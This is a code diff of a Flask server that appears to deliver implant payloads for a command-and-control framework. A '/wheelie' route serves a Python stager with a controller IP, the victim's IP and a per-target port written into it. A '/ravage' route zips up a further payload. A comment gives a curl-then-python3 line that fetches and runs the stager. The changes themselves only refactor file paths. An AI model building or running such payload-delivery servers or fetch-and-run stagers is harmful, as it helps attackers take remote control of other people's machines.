@@ -9,12 +9,6 @@ import logging
 app = Flask(__name__)
 
 WEB_SERVER_PORT = '1337'
-WHEELIE_PATH = os.path.join(os.path.dirname(__file__), '../wheelie/wheelie.py')
-WHEELIE_SOUNDWAVE_IP_PLACEHOLDER = "'<>SOUNDWAVE_IP</>'"
-WHEELIE_WEB_SEVER_PORT_PLACEHOLDER = "'<>WEB_SERVER_PORT</>'"
-WHEELIE_COMMUNICATION_PORT_PLACEHOLDER = "'<>COMMUNICATION_PORT</>'"
-WHEELIE_RAVAGE_IP_PLACEHOLDER = "'<>RAVAGE_IP</>'"
-RAVAGE_PATH = os.path.join(os.path.dirname(__file__), '../ravage')
 
 
 @app.route('/')
@@ -25,13 +19,13 @@ def hello_world():
 # curl localhost:1337/wheelie > wheelie.py; python3 wheelie.py
 @app.route('/wheelie')
 def wheelie():
-    with open(WHEELIE_PATH) as fh:
+    with open(os.path.join(os.path.dirname(__file__), 'wheelie/wheelie.py')) as fh:
         data = ''.join(fh.readlines())
     for s, r in (
-            (WHEELIE_SOUNDWAVE_IP_PLACEHOLDER, f"'{config.soundwave_ip}'"),
-            (WHEELIE_WEB_SEVER_PORT_PLACEHOLDER, f"'{WEB_SERVER_PORT}'"),
-            (WHEELIE_RAVAGE_IP_PLACEHOLDER, f"'{request.remote_addr}'"),
-            (WHEELIE_COMMUNICATION_PORT_PLACEHOLDER, f"'{target_manager.new_target(request.remote_addr)}'")
+            ('<>SOUNDWAVE_IP</>', f"'{config.soundwave_ip}'"),
+            ('<>WEB_SERVER_PORT</>', f"'{WEB_SERVER_PORT}'"),
+            ('<>RAVAGE_IP</>', f"'{request.remote_addr}'"),
+            ('<>COMMUNICATION_PORT</>', f"'{target_manager.new_target(request.remote_addr)}'")
     ):
         data = data.replace(s, r)
 
@@ -40,11 +34,13 @@ def wheelie():
 
 @app.route('/ravage')
 def ravage():
+    ravage_path = os.path.join(os.path.dirname(__file__), 'ravage')
     fn = 'ravage.zip'
     zf = zipfile.ZipFile(fn, 'w', zipfile.ZIP_DEFLATED)
-    for root, dirs, files in os.walk(RAVAGE_PATH):
+    for root, dirs, files in os.walk(ravage_path):
         for file in files:
-            zf.write(os.path.join(root, file), arcname=os.path.join(os.path.relpath(root, RAVAGE_PATH), file))
+            if '__pycache__' not in root:
+                zf.write(os.path.join(root, file), arcname=os.path.join(os.path.relpath(root, ravage_path), file))
     zf.close()
 
     with open(fn, 'rb') as fh:
